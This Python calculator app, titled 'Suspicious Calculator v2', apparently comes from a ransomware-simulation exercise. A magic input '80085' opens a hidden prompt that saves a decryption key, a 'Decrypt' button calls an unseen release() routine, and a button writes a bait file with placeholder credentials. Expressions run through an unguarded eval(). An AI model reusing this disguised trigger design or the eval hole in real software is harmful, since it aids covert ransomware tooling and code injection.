import customtkinter
from edp import release
import os
from platformdirs import user_documents_dir

def decrypt():
    release()

def history():
    document_dir = user_documents_dir()
    history_dir = os.path.join(document_dir, "CalculatorHistory")
    try:
        os.mkdir(history_dir)
    except:
        pass

def store_entry(equation, solution):
    document_dir = user_documents_dir()
    history_dir = os.path.join(document_dir, "CalculatorHistory")   
    file_contents: str
    try:
        with open(f"{history_dir}/equation_logs.txt", "r") as f:
            file_contents = f.read()
        with open(f"{history_dir}/equation_logs.txt", "w") as f:
                entry = f"{equation} = {solution},\n"
                f.write(file_contents + entry)
    except:
        with open(f"{history_dir}/equation_logs.txt", "w") as f:
            entry = f"{equation} = {solution},\n"
            f.write(entry)

def my_file_creation():
    document_dir = user_documents_dir()
    data = "username: billybobby@domain.edu \npassword: securePassword123 \nphone: 123-456-7890"
    with open(f"{document_dir}/my_file.txt", "w") as f:
        f.write(data)

def row_check(num: int) -> int:
    rows = [[0, 1, 2],[3, 4, 5],[6, 7, 8]]
    if num in rows[0]:
        return int(1)
    elif num in rows[1]:
        return int(2)
    elif num in rows[2]:
        return int(3)
    else:
        return int(0)

def column_check(num: int) -> int:
    columns = [[0, 3, 6],[1, 4, 7],[2, 5, 8]]
    if num in columns[0]:
        return int(0)
    elif num in columns[1]:
        return int(1)
    elif num in columns[2]:
        return int(2)
    else: 
        return int(0)

def operator_text(num: int):
    if num == 0:
        return "*"
    elif num == 1:
        return "/"
    elif num == 2:
        return "+"
    elif num == 3:
        return "-"
    elif num == 4:
        return "="
    else:
        pass

class App(customtkinter.CTk):
    def __init__(self):
        super().__init__()
        history()

        self.title("Suspicious Calculator v2")
        self.geometry("300x600")
        self.resizable(False, False)

        self.grid_columnconfigure((0, 1, 2), weight=1, uniform="equal")

        self.display_var = customtkinter.StringVar(value="")

        self.display_create()
        self.buttons_create()
        self.operations_create()

        self.argument_one: int
        self.argument_two: int
        self.operator: str

    def display_create(self):
            self.display = customtkinter.CTkLabel(self, textvariable=self.display_var, anchor="e", bg_color="snow3", font=("Arial", 18), text_color="black")
            self.display.grid(row=0, column=0, columnspan=3, padx=15, pady=15, sticky="ew")
                
    def buttons_create(self):
        for i in range(9):
            r = row_check(i)
            c = column_check(i)
            text_value = str(i + 1)

            button = customtkinter.CTkButton(self, text=text_value, width=50, corner_radius=10, command=lambda t=text_value: self.button_press(t))
            button.grid(row=r, column=c, padx=5, pady=5)
        zero = customtkinter.CTkButton(self, text="0", width=50, corner_radius=10, command=lambda: self.button_press("0"))
        zero.grid(row=4, column=1, padx=5, pady=5)
        clear = customtkinter.CTkButton(self, text="Clear", width=35, corner_radius=20, fg_color="grey", command=lambda: self.clear_display())
        clear.grid(row=9, column=0, padx=5, pady=5)
        my_file = customtkinter.CTkButton(self, text="Add File", width=35, corner_radius=20, fg_color="green", command=lambda: my_file_creation())
        my_file.grid(row=4, column=2, padx=5, pady=5)
        decrypt_button = customtkinter.CTkButton(self, text="Decrypt", width=35, corner_radius=20, fg_color="green", command=lambda: decrypt())
        decrypt_button.grid(row=5, column=2, padx=5, pady=5)

    def operations_create(self):
        for i in range(5):
            op_text = operator_text(i)
            operator = customtkinter.CTkButton(self, text=op_text, width=40, corner_radius=20, fg_color="orange", command=lambda o=op_text: self.button_press(o))
            r = i + 4
            operator.grid(row=r, column=0, padx=5, pady=5)

    def button_press(self, button_text: str):
        operators = ["*", "/", "+", "-"]
        display_text = self.display_var.get()
        if button_text == "=":
            self.compute()
        else:
            if len(display_text) > 0:
                if display_text[-1] in operators:
                    if button_text in operators:
                        print("Button Press: Sequential Operator Error")
                    else:
                        new_text = display_text + button_text
                        self.display_var.set(new_text)
                else:
                    new_text = display_text + button_text
                    self.display_var.set(new_text)
            else:
                if button_text in operators:
                    pass
                else:
                    new_text = display_text + button_text
                    self.display_var.set(new_text)

    def key_box(self):
        self.dialog = customtkinter.CTkInputDialog(text="Enter the decryption key: ", title="Key Box")
        pk = self.dialog.get_input()
        
        document_dir = user_documents_dir()
        calculator_history = document_dir + "/CalculatorHistory"
        present_path = calculator_history + "/Present"

        try:
            os.makedirs(present_path, exist_ok=True)
        except:
            pass
        
        with open(f"{present_path}/private_key.pem", "wb") as f:
            f.write(pk.encode("utf-8"))

    def compute(self): #called on "equals" button
        display_text = self.display_var.get()
        operators = ["*", "/", "+", "-"]
        equation = []
        temp_str = ""
        
        for char in display_text:
            if char in operators:
                equation.append(temp_str)
                temp_str = ""
                equation.append(char)
            elif char not in operators:
                temp_str += char
        equation.append(temp_str)

        #code for decryption
        solution = "".join(equation)
        if solution == "80085":
            self.key_box()
        else:
            try:
                eval_solution = eval(solution)
                store_entry(solution, eval_solution)
                self.display_var.set(eval_solution)
            except:
                self.display_var.set("")        

    def clear_display(self):
        self.display_var.set("")

if __name__ == "__main__":
    app = App()
    app.mainloop()